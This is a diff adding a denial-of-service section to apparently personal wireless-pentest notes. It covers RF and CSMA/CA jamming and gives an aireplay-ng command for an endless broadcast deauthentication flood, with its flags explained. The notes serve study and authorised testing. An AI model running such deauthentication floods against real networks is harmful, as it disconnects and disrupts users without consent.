@@ -69,3 +69,31 @@ aireplay-ng -0 1 -a00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 wlan1
 - -c 00:0F:B5:34:30:30 MAC address of client to be deauthenticated, if not provided then all stations are deauthenticated.
 - wlan1: network interface
 
+## DoS
+### RF Jamming
+
+Involves overpowering the signal of a given AP and interferring with the radio frequency transmission.
+### CSMA/CA Jamming (carrier sense multiple access with collision avoidance)
+
+In 802.11 networks using CSMA/CA a station prior to transmitting frames will send out an RTS to see if a collision has occurred, if another station is transmitting at the same time it will wait a random backoff time before attempting to re-transmit.
+
+In this type of disruption an attacker modifies the network card drivers and forces the card to continually send out information without checking for collisions.  The channel is sensed as being busy and other users are forced to wait.
+
+### Deauthentication attack
+
+To force all clients to forcibly reauthenticate.
+
+```sh
+aireplay-ng -0 0 -a00:14:6C:7E:40:80 -c FF:FF:FF:FF:FF:FF wlan1
+aireplay-ng -0 0 -a <AP-MAC> -c <Client-MAC-or-FF:-for-all> <interface>
+# FF:FF:FF:FF:FF:FF is the broadcast address which affects all clients
+```
+
+- -0: switch for deauthentication
+- 0: number of packets, 0 is infinite
+- -a: MAC address of access point
+- -c: MAC address of client or broadcast address
+
+### Wireless MITM (man in the middle)
+
+Using airbase-ng. TBD
